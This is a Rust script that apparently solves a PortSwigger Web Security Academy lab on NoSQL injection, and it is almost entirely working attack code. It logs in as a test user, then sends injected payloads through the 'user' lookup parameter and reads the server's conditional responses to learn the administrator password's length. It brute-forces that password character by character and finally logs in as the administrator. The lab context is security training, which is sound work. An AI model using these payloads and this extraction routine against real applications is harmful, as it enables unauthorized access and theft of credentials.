/********************************************************************************
*
* Lab: Exploiting NoSQL injection to extract data
*
* Hack Steps: 
*      1. Fetch the login page
*      2. Extract the csrf token and session cookie
*      3. Login as wiener to get a valid session
*      4. inject payload into 'user' query parametr to determine the length of
*         administrator's password based on conditional responses
*      5. Modify the payload to brute force the administrator's password
*      6. Fetch the login page
*      7. Extract the csrf token and session cookie
*      8. Login as the administrator
*      9. Fetch the administrator profile
*
*********************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    process,
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0af2005b036094fd81bedf32000c0086.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}
fn main() {
    println!("{} {}", "⦗#⦘ Injection parameter:".blue(), "user".yellow(),);
    print!("{}", "⦗1⦘ Fetching the login page.. ");
    flush_terminal();

    let mut login_page = fetch("/login");

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the csrf token and session cookie.. ");
    flush_terminal();

    let mut session = get_session_cookie(&login_page);
    let mut csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗3⦘ Logging in as wiener to get a valid session.. ");
    flush_terminal();

    let login_as_wiener = login("wiener", "peter", &session, &csrf_token);
    session = get_session_cookie(&login_as_wiener);

    println!("{}", "OK".green());
    println!("⦗4⦘ Determinig administrator password length.. ");

    let password_length = determine_password_length(&session);

    println!("⦗5⦘ Brute forcing password.. ");

    let admin_password = brute_force_password(password_length, &session);

    print!("\n⦗6⦘ Fetching the login page.. ");
    flush_terminal();

    login_page = fetch("/login");

    println!("{}", "OK".green());
    print!("⦗7⦘ Extracting the csrf token and session cookie.. ");
    flush_terminal();

    session = get_session_cookie(&login_page);
    csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗8⦘ Logging in as the administrator.. ");
    flush_terminal();

    let login_as_admin = login("administrator", &admin_password, &session, &csrf_token);
    session = get_session_cookie(&login_as_admin);

    println!("{}", "OK".green());
    print!("⦗9⦘ Fetching the administrator profile.. ");
    flush_terminal();

    fetch_with_session("/my-account", &session);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn login(username: &str, password: &str, session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .form(&HashMap::from([
            ("username", username),
            ("password", password),
            ("csrf", csrf_token),
        ]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()))
}

fn determine_password_length(session: &str) -> usize {
    for length in 1..50 {
        print!("\r❯❯ Checking if length = {}", length.to_string().yellow());
        flush_terminal();

        let payload = format!("administrator' %26%26 this.password.length == {length} || '");
        let injection = fetch_with_session(&format!("/user/lookup?user={payload}"), &session);
        let body = injection.text().unwrap();

        if text_is_not_exist_in_body("Could not find user", &body) {
            println!(" [ Correct length: {} ]", length.to_string().green());
            return length;
        } else {
            continue;
        }
    }

    println!("{}", "⦗!⦘ Failed to determine the password length".red());
    process::exit(1);
}

fn brute_force_password(password_length: usize, session: &str) -> String {
    let mut correct_password = String::new();

    for position in 0..password_length {
        for character in "0123456789abcdefghijklmnopqrstuvwxyz".chars() {
            print!(
                "\r❯❯ Checking if char at position {} = {}",
                position.to_string().blue(),
                character.to_string().yellow()
            );
            flush_terminal();

            let payload =
                format!("administrator' %26%26 this.password[{position}] == '{character}' || '");
            let injection = fetch_with_session(&format!("/user/lookup?user={payload}"), &session);
            let body = injection.text().unwrap();

            if text_is_not_exist_in_body("Could not find user", &body) {
                correct_password.push(character);
                print!(" [ Correct password: {} ]", correct_password.green());
                break;
            } else {
                continue;
            }
        }
    }
    return correct_password;
}

fn text_is_not_exist_in_body(pattern: &str, text: &str) -> bool {
    let regex = Regex::new(pattern).unwrap();
    let is_exist = regex.find(text);
    if is_exist.is_none() {
        true
    } else {
        false
    }
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
